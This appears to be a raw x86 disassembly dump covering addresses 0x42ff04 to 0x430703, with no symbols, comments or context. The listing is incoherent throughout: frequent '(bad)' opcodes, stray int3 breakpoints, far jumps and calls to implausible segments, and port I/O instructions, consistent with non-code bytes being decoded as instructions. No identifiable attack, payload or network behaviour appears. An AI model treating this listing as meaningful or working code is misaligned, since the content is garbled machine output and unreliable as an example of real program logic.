  42ff04:	add    BYTE PTR [ecx],dh
  42ff06:	cmp    al,0xab
  42ff08:	inc    DWORD PTR [eax]
  42ff0a:	dec    DWORD PTR [ecx-0x7cd5ffe1]
  42ff10:	inc    DWORD PTR [edx]
  42ff12:	in     al,0xdb
  42ff14:	add    BYTE PTR [ecx],ch
  42ff16:	int    0xd6
  42ff18:	cmp    edi,0xffffffff
  42ff1b:	call   FWORD PTR [ecx]
  42ff1d:	call   ebp
  42ff1f:	int3   
  42ff20:	add    BYTE PTR [esi+0x34],ah
  42ff23:	pop    esi
  42ff24:	call   FWORD PTR [ebx+0x6d]
  42ff27:	mov    esp,0xffff00cc
  42ff2c:	mov    ebp,0x1900
  42ff31:	mov    dh,0x23
  42ff33:	add    BYTE PTR es:0xff9892,cl
  42ff3a:	dec    DWORD PTR [ecx-0x3344ff65]
  42ff40:	add    BYTE PTR [eax+0x6b],bh
  42ff43:	repnz add BYTE PTR [esi],bh
  42ff46:	xlat   BYTE PTR ds:[ebx]
  42ff47:	adc    al,BYTE PTR [ebx-0x11003400]
  42ff4d:	call   DWORD PTR [esi-0x1]
  42ff50:	add    BYTE PTR [ebx-0x787ce75d],ah
  42ff56:	fcom   QWORD PTR [esi-0x1]
  42ff5c:	mov    dh,0xcc
  42ff5e:	mov    dl,0x0
  42ff60:	sub    DWORD PTR [edi-0x4cff8432],0xffffffa1
  42ff67:	arpl   di,di
  42ff69:	int3   
  42ff6a:	add    bh,bh
  42ff6c:	and    eax,DWORD PTR [eax]
  42ff6e:	xor    al,0x83
  42ff70:	add    BYTE PTR [ecx],dh
  42ff72:	sbb    al,0xd1
  42ff74:	cmp    edx,0x72
  42ff77:	stc    
  42ff78:	add    BYTE PTR [ebx-0x7c92007d],al
  42ff7e:	inc    DWORD PTR cs:[ebx-0x7c1c07a5]
  42ff85:	cmp    esi,0xfffffff8
  42ff88:	add    bh,bh
  42ff8a:	(bad)  
  42ff8b:	call   DWORD PTR [esi+0x0]
  42ff8e:	pop    ds
  42ff8f:	add    BYTE PTR [ebx+0x9524aa],al
  42ff95:	jmp    0xccff:0xc23b
  42ff9c:	push   esi
  42ff9d:	add    BYTE PTR [eax-0x1],dh
  42ffa0:	jmp    DWORD PTR [edx-0x5affda20]
  42ffa6:	fsub   DWORD PTR [eax-0x3300ff7d]
  42ffac:	or     eax,DWORD PTR [eax]
  42ffae:	mov    esp,0xf4ed00cc
  42ffb3:	inc    ecx
  42ffb4:	add    BYTE PTR [esi-0x4d],al
  42ffb7:	jl     0x42ffb9
  42ffb9:	inc    DWORD PTR [eax]
  42ffbb:	sub    DWORD PTR [esi-0x7d],0x6b
  42ffbf:	inc    DWORD PTR [eax]
  42ffc1:	push   ebx
  42ffc2:	lea    ebx,[eax-0x782c4201]
  42ffc8:	add    bh,bh
  42ffca:	inc    DWORD PTR [eax]
  42ffcc:	ror    BYTE PTR [ecx-0x37ff0042],1
  42ffd2:	(bad)  
  42ffd3:	jnp    0x42ffd4
  42ffd5:	xchg   DWORD PTR [edi+0xff838d],esi
  42ffdb:	dec    DWORD PTR [esi+0x0]
  42ffde:	adc    bh,bh
  42ffe0:	mov    ecx,esi
  42ffe2:	add    al,0x66
  42ffe4:	add    BYTE PTR [esi],dh
  42ffe6:	mov    ds:0xffff8354,al
  42ffeb:	add    BYTE PTR [ebx-0x77],ah
  42ffee:	mov    ebp,0x80f6cc00
  42fff3:	out    0xcc,al
  42fff5:	sub    eax,0xffffbf8f
  42fffa:	add    BYTE PTR [eax],al
  42fffc:	jb     0x42fffd
  42fffe:	mov    ah,0xff
  430000:	push   esp
  430002:	stos   DWORD PTR es:[edi],eax
  430003:	or     DWORD PTR [ecx-0x339a1056],ecx
  430009:	inc    DWORD PTR [eax]
  43000b:	add    DWORD PTR [edi+edi*8-0x79],0x0
  430010:	call   DWORD PTR [edx]
  430012:	or     al,dl
  430014:	xor    ecx,0x64
  430017:	jg     0x42ff9c
  430019:	inc    DWORD PTR [eax]
  43001b:	add    BYTE PTR [edi+0x0],dl
  43001e:	les    eax,FWORD PTR [eax]
  430020:	add    BYTE PTR [ebx+eiz*4+0x2718ff52],bl
  430027:	jp     0x430028
  430029:	add    BYTE PTR [eax],al
  43002b:	mov    DWORD PTR [edx+0xff5bff],esp
  430031:	sbb    BYTE PTR [esi],al
  430033:	sub    eax,DWORD PTR [ebx-0x7c9e9fd5]
  430039:	(bad)  
  43003a:	inc    DWORD PTR [eax]
  43003c:	scas   eax,DWORD PTR es:[edi]
  43003d:	add    BYTE PTR [edi+edi*8],ah
  430040:	add    BYTE PTR [edx-0x21],dl
  430043:	ins    BYTE PTR es:[edi],dx
  430044:	add    BYTE PTR [ebx],ch
  430046:	sbb    ch,cl
  430048:	cmp    edi,0xffffffff
  43004b:	dec    DWORD PTR [edi]
  43004d:	(bad)  
  43004e:	jmp    0xff0d:0x1ae4cc00
  430055:	xor    ebp,edx
  430057:	sub    eax,0xff00ffff
  43005c:	sub    eax,0x66ff
  430061:	push   esp
  430062:	jnp    0x430088
  430064:	mov    DWORD PTR [ecx+0x7e],ebp
  430067:	lods   al,BYTE PTR ds:[esi]
  430068:	dec    esp
  43006a:	add    bh,bh
  43006c:	bound  eax,QWORD PTR [eax]
  43006e:	into   
  43006f:	add    BYTE PTR [eax],al
  430071:	cdq    
  430072:	lea    edx,[edi+edi*8]
  430075:	or     dh,0x5c
  430078:	inc    DWORD PTR [ebx-0x87ff01]
  43007e:	push   esp
  43007f:	(bad)  
  430080:	(bad)  
  430081:	cld    
  430082:	mov    bh,0x87
  430084:	sub    eax,0xfffffffb
  430087:	rol    BYTE PTR [ebx-0x7a007c7d],cl
  43008d:	call   FWORD PTR [ecx]
  43008f:	int3   
  430090:	and    DWORD PTR ds:0x43009230,0xffffffb4
  430097:	out    dx,eax
  430098:	inc    DWORD PTR [eax]
  43009a:	inc    DWORD PTR [ebx-0x7cffe1]
  4300a0:	push   DWORD PTR [eax+ebx*8]
  4300a3:	mov    ah,0xff
  4300a5:	mov    al,0xe2
  4300a7:	repnz inc DWORD PTR [ebx-0x33b20000]
  4300ae:	pop    edi
  4300af:	add    bh,bh
  4300b1:	or     eax,0xb9003962
  4300b6:	std    
  4300b7:	jecxz  0x430042
  4300b9:	add    BYTE PTR [ebx-0x737cc534],al
  4300bf:	(bad)  
  4300c0:	jmp    edx
  4300c2:	cld    
  4300c3:	sub    al,0xff
  4300c5:	adc    al,0x36
  4300c7:	push   cs
  4300c8:	add    BYTE PTR [ebx+0x45ffff],al
  4300ce:	sbb    DWORD PTR [ebx+0x1863ff00],eax
  4300d4:	add    BYTE PTR [ebp+0x70],bh
  4300d7:	mov    ah,0x0
  4300d9:	inc    DWORD PTR [eax]
  4300db:	(bad)  
  4300dc:	std    
  4300dd:	jmp    DWORD PTR [esi+0xb6100ff]
  4300e3:	or     al,0x0
  4300e5:	mov    bh,0xc9
  4300e7:	retf   
  4300e8:	(bad)  
  4300e9:	(bad)  
  4300ea:	(bad)  
  4300eb:	push   DWORD PTR [edx]
  4300ed:	add    bh,al
  4300ef:	(bad)  
  4300f0:	call   FWORD PTR [esi+0x7a]
  4300f3:	mov    ?,edi
  4300f5:	ffreep st(0)
  4300f7:	xor    eax,0x8389ffcc
  4300fc:	sbb    eax,0xff89d883
  430101:	pop    esi
  430102:	test   al,0xa4
  430104:	int3   
  430105:	test   BYTE PTR [eax+0x29],0xcc
  430109:	(bad)  
  43010a:	inc    DWORD PTR [ebx-0x8e3374]
  430110:	(bad)  
  430111:	ffree  st(5)
  430113:	xchg   esi,eax
  430114:	int3   
  430115:	(bad)  
  430117:	(bad)  
  430119:	(bad)  
  43011a:	inc    DWORD PTR [ebx+0xa883c9]
  430120:	int3   
  430121:	mov    ebp,0x2cff4a44
  430126:	in     eax,dx
  430127:	inc    ecx
  430128:	mov    DWORD PTR [ebx-0x870100],eax
  43012e:	add    ah,cl
  430130:	dec    DWORD PTR [eax-0x6200ac4b]
  430136:	inc    esi
  430137:	and    edi,edi
  430139:	add    DWORD PTR [ebx+0x51cc27ff],0x0
  430140:	(bad)  
  430141:	stc    
  430142:	imul   ecx
  430144:	add    BYTE PTR [eax+0x50],ch
  430147:	rol    BYTE PTR [ebx+0x2aff0000],cl
  43014d:	(bad)  
  43014e:	jg     0x430150
  430150:	add    al,bl
  430152:	loop   0x430131
  430154:	jmp    DWORD PTR [esp+edi*2]
  430157:	and    eax,0xffffffff
  43015c:	repz add BYTE PTR [eax-0x71067c77],bh
  430163:	sbb    al,BYTE PTR [eax]
  430165:	out    dx,al
  430166:	push   esi
  430167:	retf   0xcc00
  43016a:	dec    esp
  43016c:	popf   
  43016d:	jmp    FWORD PTR [edx]
  43016f:	int3   
  430170:	cmp    DWORD PTR [ecx-0x5b],0xffffff8c
  430174:	push   ebp
  430176:	outs   dx,DWORD PTR ds:[esi]
  430177:	sbb    bh,bh
  430179:	inc    DWORD PTR [ebx-0x2f334500]
  43017f:	(bad)  
  430180:	push   DWORD PTR [ecx-0x11]
  430183:	xchg   esp,eax
  430184:	call   DWORD PTR [edi]
  430186:	mov    eax,ds:0xff000042
  43018b:	(bad)  
  43018c:	fiadd  WORD PTR [eax]
  43018e:	fwait
  43018f:	inc    DWORD PTR [eax]
  430191:	add    eax,0xd4002f8b
  430196:	push   0x8389ff12
  43019b:	jmp    FWORD PTR [edi]
  43019d:	add    BYTE PTR [ebx],cl
  43019f:	cmp    edi,0x11
  4301a2:	cmp    ebx,DWORD PTR [ebp-0x34]
  4301a5:	mov    edx,ebp
  4301a7:	bound  eax,QWORD PTR [eax]
  4301a9:	add    BYTE PTR [eax],al
  4301ab:	add    BYTE PTR [edx],al
  4301ad:	add    BYTE PTR [ebp-0x27a30001],cl
  4301b3:	xor    al,BYTE PTR [eax]
  4301b5:	cmp    eax,0xffff24eb
  4301ba:	(bad)  
  4301bb:	push   DWORD PTR [edx+0x0]
  4301be:	outs   dx,DWORD PTR ds:[esi]
  4301bf:	(bad)  
  4301c0:	jmp    esp
  4301c2:	repz xor DWORD PTR [ebx+0xd8f556],eax
  4301c9:	add    BYTE PTR [ebx+0x1e0051ff],al
  4301cf:	dec    esp
  4301d1:	out    0xb,al
  4301d3:	jge    0x4301d4
  4301d5:	stos   BYTE PTR es:[edi],al
  4301d6:	lahf   
  4301d7:	mov    al,BYTE PTR [ebx+0x56ffffcc]
  4301dd:	add    BYTE PTR [esi],ch
  4301df:	(bad)  
  4301e0:	jmp    FWORD PTR [ebp-0x157c0739]
  4301e6:	adc    dl,BYTE PTR [esi-0x77]
  4301e9:	dec    esp
  4301eb:	(bad)  
  4301ec:	mov    esp,0xffffac89
  4301f1:	xchg   ecx,eax
  4301f2:	bound  esi,QWORD PTR [eax]
  4301f4:	int3   
  4301f5:	imul   esp,DWORD PTR [ecx+0x4a],0x0
  4301f9:	add    bh,bh
  4301fb:	add    BYTE PTR [edi],dl
  4301fd:	push   DWORD PTR [ebx+eax*4]
  430200:	(bad)  
  430201:	cmp    DWORD PTR [edx-0x2c89ff3f],edx
  430207:	out    dx,al
  430208:	add    BYTE PTR [ecx-0x380001],cl
  43020e:	pushf  
  43020f:	add    bh,bh
  430211:	cwde   
  430212:	mov    ebx,0x306cff18
  430217:	pop    ss
  430218:	(bad)  
  430219:	inc    DWORD PTR [eax]
  43021b:	add    BYTE PTR [ecx],dh
  43021d:	int3   
  43021e:	loop   0x43021f
  430220:	sub    DWORD PTR [ebx],0x4e
  430223:	dec    ebx
  430224:	int3   
  430225:	mov    ah,0x94
  430227:	(bad)  
  430229:	int3   
  43022a:	add    bh,bh
  43022c:	xchg   edi,edi
  43022e:	xor    edi,edi
  430230:	(bad)  
  430231:	fist   DWORD PTR [ebx]
  430233:	je     0x430235
  430235:	test   BYTE PTR [edi],bl
  430237:	mov    bh,0xff
  430239:	add    bh,bh
  43023b:	add    BYTE PTR ds:0xffa0ff,dh
  430241:	jae    0x43026c
  430243:	or     al,0x0
  430245:	xchg   ecx,esp
  430247:	push   ss
  430248:	(bad)  
  430249:	dec    esp
  43024b:	cmp    DWORD PTR [ebx+0xcc6889],0x69
  430252:	rcr    BYTE PTR [eax+0x4edcaa00],0x83
  430259:	(bad)  
  43025a:	inc    DWORD PTR [ebx+0x780041]
  430260:	and    DWORD PTR [eax],0x22
  430263:	xchg   ebp,eax
  430264:	call   DWORD PTR [ecx+0xffa13b]
  43026a:	inc    DWORD PTR [eax]
  43026c:	dec    esi
  43026d:	add    BYTE PTR [edi],dl
  43026f:	dec    DWORD PTR [ecx-0x7ca5cc38]
  430275:	dec    ecx
  430276:	cdq    
  430277:	push   0xff000089
  43027c:	inc    ecx
  43027d:	push   DWORD PTR [ecx-0x7d]
  430280:	add    BYTE PTR [edx],al
  430282:	mov    bh,0x40
  430284:	push   DWORD PTR [eax-0x1d]
  430287:	rol    BYTE PTR [eax],1
  430289:	inc    DWORD PTR [eax]
  43028b:	jmp    FWORD PTR [esi-0xffe401]
  430291:	js     0x43030b
  430293:	aaa    
  430294:	inc    DWORD PTR [ebx+0x27]
  430297:	mov    dh,0x0
  430299:	add    BYTE PTR [eax],al
  43029b:	mov    esp,esp
  43029d:	push   DWORD PTR [esi]
  43029f:	or     DWORD PTR [ecx-0xbb73ac],0xffffffdd
  4302a6:	xor    BYTE PTR [ecx-0x34],dh
  4302a9:	cmp    edi,0xffffffff
  4302ac:	ret    0x30ff
  4302af:	cmp    edi,0xffffffcb
  4302b2:	scas   al,BYTE PTR es:[edi]
  4302b3:	or     DWORD PTR [ebx-0x5d86e3],eax
  4302b9:	mov    DWORD PTR [ecx+0x660087ff],ecx
  4302bf:	(bad)  
  4302c0:	dec    DWORD PTR [edx+0x5]
  4302c3:	repnz and DWORD PTR [ecx],0x47
  4302c7:	fild   DWORD PTR [ebx-0x600ff01]
  4302cd:	cmp    DWORD PTR [edi+0x522e0000],0x4a
  4302d4:	xor    edx,0xffffffc4
  4302d7:	retf   0x8900
  4302da:	add    bh,bh
  4302dc:	mov    edi,edi
  4302de:	test   edi,edi
  4302e0:	dec    DWORD PTR [edi-0x56ffeef7]
  4302e6:	pop    esp
  4302e7:	outs   dx,DWORD PTR ds:[esi]
  4302e8:	(bad)  
  4302e9:	inc    DWORD PTR [eax]
  4302eb:	add    BYTE PTR [edi+edi*8+0x2d],dh
  4302ef:	int3   
  4302f0:	int3   
  4302f1:	xchg   ecx,eax
  4302f2:	test   eax,0x69eecc1f
  4302f7:	jne    0x4302f8
  4302f9:	(bad)  
  4302fa:	(bad)  
  4302fb:	(bad)  
  4302fc:	cmp    eax,0xff839400
  430301:	push   esp
  430302:	fcom   DWORD PTR [ebx+0x4b2d1800]
  430308:	(bad)  
  430309:	(bad)  
  43030a:	(bad)  
  43030b:	(bad)  
  43030c:	jmp    0x8442e810
  430311:	or     eax,0x70ffdc33
  430316:	dec    eax
  430317:	fdiv   st(7),st
  430319:	(bad)  
  43031a:	inc    DWORD PTR [ebx-0x7cbb00ae]
  430320:	dec    edx
  430322:	mov    ah,0x69
  430324:	add    dh,bl
  430326:	dec    DWORD PTR [ebx-0x10000]
  43032c:	ja     0x43032d
  43032e:	rol    DWORD PTR [eax],1
  430330:	(bad)  
  430331:	jns    0x430396
  430333:	mov    bl,0x89
  430335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430337:	dec    ecx
  430338:	inc    DWORD PTR [ebx+0x8cffff]
  43033e:	idiv   bh
  430340:	add    BYTE PTR [edx+edi*1+0x5742ff78],dh
  430347:	xchg   edx,eax
  430348:	(bad)  
  430349:	dec    DWORD PTR [ecx-0x36ffbe00]
  43034f:	(bad)  
  430350:	(bad)  
  430351:	fdivrp st(1),st
  430353:	inc    ebp
  430354:	inc    DWORD PTR [edi+0x30]
  430357:	cmp    al,0xff
  430359:	add    bh,bh
  43035b:	dec    DWORD PTR [ecx-0x7c33b801]
  430361:	jl     0x43037f
  430363:	lock int3 
  430365:	aaa    
  430366:	mov    esp,0x89ff0d
  43036b:	push   DWORD PTR [ecx+ecx*4]
  43036e:	pop    ds
  43036f:	add    bh,bh
  430371:	sub    dh,ah
  430373:	pop    ecx
  430374:	add    BYTE PTR [edi-0x767cc141],ch
  43037a:	dec    esp
  43037c:	imul   eax,DWORD PTR [ebx+0x600ff0b],0xffffffe7
  430383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430384:	mov    DWORD PTR [eax],ebp
  430386:	adc    BYTE PTR [ebx],0x0
  430389:	(bad)  
  43038a:	inc    DWORD PTR [eax]
  43038c:	sbb    edi,edi
  43038e:	inc    eax
  43038f:	add    bh,bh
  430391:	fwait
  430392:	dec    ebp
  430393:	leave  
  430394:	mov    esi,esp
  430396:	sti    
  430397:	je     0x43031c
  430399:	add    BYTE PTR [eax],al
  43039b:	jmp    edx
  43039d:	add    DWORD PTR [edx],0xffffffff
  4303a0:	add    DWORD PTR [ebx+ebx*2+0x31e0ff16],0xffffffb5
  4303a8:	(bad)  
  4303a9:	inc    DWORD PTR [eax]
  4303ab:	add    BYTE PTR [ebp-0xffd201],dh
  4303b1:	cli    
  4303b2:	aas    
  4303b3:	mov    eax,ds:0xb10f1700
  4303b8:	inc    DWORD PTR [eax]
  4303ba:	dec    esp
  4303bc:	jnp    0x430341
  4303be:	fld    QWORD PTR [ebx+0x6ed2a2cc]
  4303c4:	mov    DWORD PTR [esi-0x3e],eax
  4303c7:	pushf  
  4303c8:	inc    DWORD PTR [eax]
  4303ca:	int3   
  4303cb:	call   FWORD PTR [eax+eax*1+0x73ff00b8]
  4303d2:	repnz and bh,bh
  4303d5:	sbb    esp,ebx
  4303d7:	jecxz  0x430362
  4303d9:	inc    DWORD PTR [eax]
  4303db:	int3   
  4303dc:	imul   eax,DWORD PTR [eax],0x54
  4303df:	inc    DWORD PTR [eax]
  4303e1:	in     eax,dx
  4303e2:	call   ebx
  4303e4:	add    cl,dl
  4303e6:	(bad)  
  4303e7:	cdq    
  4303e8:	inc    DWORD PTR [eax]
  4303ea:	add    BYTE PTR [ecx-0xb07623],cl
  4303f0:	push   ebp
  4303f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4303f3:	repz call DWORD PTR [ebp+esi*8-0x46]
  4303f8:	add    BYTE PTR [eax],al
  4303fa:	int3   
  4303fb:	push   DWORD PTR [esi-0xed00]
  430401:	push   esi
  430402:	shl    BYTE PTR [eax-0x7d],cl
  430405:	push   ebp
  430406:	aam    0xad
  430408:	inc    DWORD PTR [eax]
  43040a:	(bad)  
  43040b:	dec    esp
  43040d:	add    BYTE PTR [edx+0x7a950000],cl
  430413:	xor    eax,0xc0e884cc
  430418:	(bad)  
  430419:	(bad)  
  43041a:	(bad)  
  43041b:	dec    DWORD PTR [edi]
  43041d:	mov    DWORD PTR [ecx],edx
  43041f:	dec    esp
  430421:	mov    BYTE PTR [eax-0x22],ch
  430424:	dec    DWORD PTR [edx]
  430426:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  430428:	(bad)  
  430429:	(bad)  
  43042a:	(bad)  
  43042b:	inc    DWORD PTR [esi]
  43042d:	call   edi
  43042f:	add    bh,bh
  430431:	xchg   edx,eax
  430432:	xor    al,0xa1
  430434:	push   DWORD PTR ds:0x28ba
  43043a:	inc    DWORD PTR [eax]
  43043c:	test   BYTE PTR [ebx-0x1f00ff83],0x55
  430443:	xor    bh,bh
  430445:	push   cs
  430446:	jbe    0x4304a7
  430448:	add    BYTE PTR [ecx-0xf37c34],cl
  43044e:	cdq    
  43044f:	add    BYTE PTR [eax],al
  430451:	cmp    BYTE PTR [eax-0x263b005c],cl
  430457:	lock add DWORD PTR [eax],0xffffffff
  43045b:	add    bl,cl
  43045d:	add    BYTE PTR [esi+0x0],dl
  430460:	add    BYTE PTR [eax],dl
  430462:	jl     0x4303e6
  430464:	or     DWORD PTR [edi-0x57],0xfffffff5
  430468:	dec    esp
  43046a:	add    ah,cl
  43046c:	xor    al,BYTE PTR [ebx+0x2dfffff7]
  430472:	cmc    
  430473:	push   es
  430474:	(bad)  
  430475:	cmp    ebp,DWORD PTR [edi+edi*1-0x1]
  430479:	inc    DWORD PTR [ebx+0x44ffbd00]
  43047f:	inc    DWORD PTR [eax]
  430481:	out    dx,eax
  430482:	jno    0x430436
  430484:	(bad)  
  430485:	aas    
  430486:	or     bl,BYTE PTR [eax+0x0]
  430489:	add    BYTE PTR [ecx+0x63ff8e83],cl
  43048f:	add    BYTE PTR [eax],al
  430491:	aad    0x12
  430493:	ja     0x430461
  430495:	inc    ebx
  430496:	push   0xd
  430498:	inc    DWORD PTR [eax]
  43049a:	inc    DWORD PTR [eax]
  43049c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43049d:	add    al,bl
  43049f:	mov    DWORD PTR [ecx+0x96987d],ecx
  4304a5:	mov    edx,DWORD PTR [ecx]
  4304a7:	cdq    
  4304a8:	(bad)  
  4304a9:	(bad)  
  4304aa:	(bad)  
  4304ab:	jmp    DWORD PTR [edi+0x0]
  4304ae:	into   
  4304af:	inc    DWORD PTR [eax]
  4304b1:	add    ah,dl
  4304b3:	jle    0x4304b5
  4304b5:	adc    edx,DWORD PTR [eax+0xffff04]
  4304bb:	push   DWORD PTR [eax+0xff26ff]
  4304c1:	dec    esp
  4304c2:	mov    edx,esi
  4304c4:	add    cl,dh
  4304c6:	push   0xffffffcd
  4304c8:	(bad)  
  4304c9:	inc    DWORD PTR [ebx-0xe006301]
  4304cf:	(bad)  
  4304d0:	push   esp
  4304d2:	sbb    BYTE PTR [edi],ah
  4304d4:	push   DWORD PTR [ebx+0xffb8ad]
  4304da:	add    BYTE PTR [eax],al
  4304dc:	jo     0x4304dd
  4304de:	or     bh,bh
  4304e0:	dec    ecx
  4304e2:	(bad)  
  4304e3:	fld    DWORD PTR [eax]
  4304e5:	add    BYTE PTR [eax+0x70],ah
  4304e8:	dec    DWORD PTR [ecx+0xa0ff83]
  4304ee:	mov    dh,0x0
  4304f0:	(bad)  
  4304f1:	mov    edx,0xa8ff7e98
  4304f6:	dec    ecx
  4304f7:	jbe    0x4304c5
  4304f9:	(bad)  
  4304fa:	inc    DWORD PTR [eax]
  4304fc:	cmp    bh,0xf4
  4304ff:	add    bh,bh
  430501:	sub    al,0xf8
  430503:	cmp    al,0x83
  430505:	jl     0x430497
  430507:	xchg   ebx,eax
  430508:	add    BYTE PTR [ebx-0x764a7d00],al
  43050e:	jp     0x430510
  430510:	mov    DWORD PTR [esi+0x5fff021b],ebx
  430516:	xchg   ebx,eax
  430517:	mov    al,ds:0xff00ff00
  43051c:	(bad)  
  43051d:	int3   
  43051e:	scas   eax,DWORD PTR es:[edi]
  43051f:	add    bh,bh
  430521:	test   DWORD PTR [esi+0xa],0xb8786cff
  430528:	(bad)  
  430529:	inc    DWORD PTR [eax]
  43052b:	xor    DWORD PTR [ecx-0x1],0x3
  43052f:	inc    DWORD PTR [eax]
  430531:	inc    edi
  430532:	pop    ecx
  430533:	or     bh,bh
  430535:	jge    0x4304c3
  430537:	dec    ebx
  430538:	inc    DWORD PTR [eax]
  43053a:	inc    DWORD PTR [eax]
  43053c:	rol    BYTE PTR [eax],1
  43053e:	fild   WORD PTR [eax]
  430540:	call   DWORD PTR [edx-0x687c3430]
  430546:	mov    bl,0x8f
  430548:	add    DWORD PTR [eax],0xffffffff
  43054b:	add    BYTE PTR [eax],dl
  43054d:	dec    DWORD PTR [eax+eax*1-0x1]
  430551:	pop    edi
  430552:	sar    DWORD PTR [edx+0x51122900],1
  430558:	inc    DWORD PTR [ebx-0x7cfe0034]
  43055e:	mov    dh,0x89
  430560:	add    bl,ah
  430562:	mov    al,0xe3
  430564:	call   DWORD PTR [ebx-0x50]
  430567:	lods   al,BYTE PTR ds:[esi]
  430568:	(bad)  
  430569:	(bad)  
  43056a:	(bad)  
  43056b:	jmp    FWORD PTR [eax+eax*1+0x6f]
  43056f:	add    ah,cl
  430571:	rcr    ebx,cl
  430573:	sar    bh,cl
  430575:	xchg   DWORD PTR [eax+0x838387],edi
  43057b:	push   DWORD PTR [ebx-0x1]
  43057e:	push   ebx
  43057f:	add    bh,bh
  430581:	repnz sub BYTE PTR [ecx+0x0],0x7
  430586:	ja     0x430540
  430588:	add    BYTE PTR [ebx-0x29ff01],al
  43058e:	jns    0x430590
  430590:	adc    DWORD PTR [eax],0xffffffb4
  430593:	or     al,0x83
  430595:	add    DWORD PTR [ecx+0xff8349],eax
  43059b:	call   FWORD PTR [esi]
  43059d:	int3   
  43059e:	fild   DWORD PTR [ebx-0x7568a301]
  4305a4:	jmp    FWORD PTR [esi]
  4305a6:	dec    edi
  4305a7:	stos   DWORD PTR es:[edi],eax
  4305a8:	dec    DWORD PTR [ecx-0x7ce9ff01]
  4305ae:	lods   eax,DWORD PTR ds:[esi]
  4305af:	add    BYTE PTR [eax],al
  4305b1:	icebp  
  4305b2:	inc    ebx
  4305b3:	jo     0x430581
  4305b5:	loopne 0x4305de
  4305b7:	loope  0x4305b9
  4305b9:	add    DWORD PTR [ebx+0x7dffd5ff],0x0
  4305c0:	add    BYTE PTR [esi-0x6500e2d9],dh
  4305c6:	add    ecx,ecx
  4305c8:	add    bh,bh
  4305ca:	int3   
  4305cb:	jmp    FWORD PTR [edi-0x7600fd00]
  4305d1:	xchg   DWORD PTR [edi-0x7a],edx
  4305d4:	add    BYTE PTR [ebx],bh
  4305d6:	xor    eax,0xff00cc77
  4305db:	add    cl,bl
  4305dd:	add    BYTE PTR [ebx-0x676b0100],bh
  4305e3:	outs   dx,DWORD PTR ds:[esi]
  4305e4:	push   DWORD PTR [edx+0xff1b0a]
  4305ea:	add    BYTE PTR [eax],al
  4305ec:	mov    al,0x89
  4305ee:	pop    es
  4305ef:	inc    DWORD PTR [ebx-0x3334c1a9]
  4305f5:	stos   DWORD PTR es:[edi],eax
  4305f6:	push   0x49
  4305f8:	add    bh,bh
  4305fa:	add    bh,bh
  4305fc:	daa    
  4305fd:	xor    DWORD PTR [edi],0xffffff89
  430600:	add    BYTE PTR [ebx+0x27ffa5fd],cl
  430606:	add    al,0xcf
  430608:	add    bh,bh
  43060a:	add    bh,bh
  43060c:	mov    al,0x0
  43060e:	mov    DWORD PTR [eax],eax
  430610:	cmp    DWORD PTR [ebp-0x54],0x34
  430614:	dec    DWORD PTR [edx]
  430616:	mov    dl,0x22
  430618:	dec    esp
  43061a:	add    BYTE PTR [eax],al
  43061c:	cs int3 
  43061e:	or     eax,DWORD PTR [eax]
  430620:	inc    DWORD PTR [ecx-0x75004245]
  430626:	out    0x6d,al
  430628:	add    BYTE PTR [eax],al
  43062a:	inc    DWORD PTR [eax]
  43062c:	out    0xcc,eax
  43062e:	mov    ds:0xdd1200ff,al
  430633:	or     al,BYTE PTR [eax]
  430635:	push   es
  430636:	fcom   QWORD PTR [esi+0xffff]
  43063c:	xchg   edi,edi
  43063e:	clc    
  43063f:	int3   
  430640:	add    bl,al
  430642:	not    DWORD PTR [esi]
  430644:	(bad)  
  430645:	(bad)  [edx+0x66]
  430648:	inc    DWORD PTR [eax]
  43064a:	(bad)  
  43064b:	call   DWORD PTR [ebp-0x1]
  43064e:	mov    ds:0x77240000,al
  430653:	or     esp,0xe
  430656:	aas    
  430657:	js     0x4305dc
  430659:	inc    DWORD PTR [eax]
  43065b:	mov    DWORD PTR [ebp+0x0],esp
  43065e:	inc    WORD PTR [eax]
  430661:	in     al,0x64
  430663:	idiv   edi
  430665:	dec    ebx
  430666:	mov    WORD PTR [eax],es
  430668:	dec    DWORD PTR [ecx+0x20089]
  43066e:	cdq    
  43066f:	add    BYTE PTR [eax],al
  430671:	add    al,0xb9
  430673:	adc    eax,0xf1712fff
  430678:	inc    DWORD PTR [eax]
  43067a:	add    bh,bh
  43067c:	repnz (bad) 
  43067e:	jmp    0x13608983
  430683:	and    DWORD PTR [ebx+0xf63764],eax
  430689:	add    bh,bh
  43068b:	add    bl,ah
  43068d:	jmp    esi
  43068f:	inc    DWORD PTR [eax]
  430691:	or     BYTE PTR [edx+esi*2],dl
  430694:	xor    DWORD PTR [ebp-0x46],0xffffff84
  430698:	(bad)  
  430699:	inc    DWORD PTR [eax]
  43069b:	add    BYTE PTR [ecx],ah
  43069d:	call   FWORD PTR [ecx]
  43069f:	add    bh,bh
  4306a1:	mov    eax,ds:0xcd83a529
  4306a6:	out    dx,eax
  4306a7:	retf   0xff
  4306aa:	add    BYTE PTR [eax],al
  4306ac:	and    DWORD PTR ss:[edx-0x282bff01],0xffffffdd
  4306b4:	add    BYTE PTR [esi],bl
  4306b6:	ds mov al,0x83
  4306b9:	(bad)  
  4306ba:	dec    DWORD PTR [ecx-0xf8334c]
  4306c0:	add    DWORD PTR [ecx-0xc7c5483],0xffffffe6
  4306c7:	xlat   BYTE PTR ds:[ebx]
  4306c8:	add    bh,bh
  4306ca:	(bad)  
  4306cb:	push   esp
  4306cd:	add    BYTE PTR [edx],bh
  4306cf:	inc    DWORD PTR [eax]
  4306d1:	or     edi,DWORD PTR [ebx-0x986009c]
  4306d7:	sub    edi,edi
  4306d9:	(bad)  
  4306da:	inc    DWORD PTR [ebx-0x7300d6]
  4306e0:	(bad)  
  4306e1:	fisttp DWORD PTR [eax+ebp*4-0x1]
  4306e5:	push   edx
  4306e6:	jp     0x43070b
  4306e8:	cmp    edi,0xffffffff
  4306eb:	int3   
  4306ec:	int3   
  4306ed:	jmp    edx
  4306ef:	inc    DWORD PTR [ebx+0xec2dc3]
  4306f5:	aas    
  4306f6:	mov    BYTE PTR [ebp+0x0],bh
  4306f9:	add    BYTE PTR [ecx-0x1400e97d],cl
  4306ff:	(bad)  
  430700:	jmp    ecx
  430702:	pop    ebx
  430703:	cmp    bh,0xe4
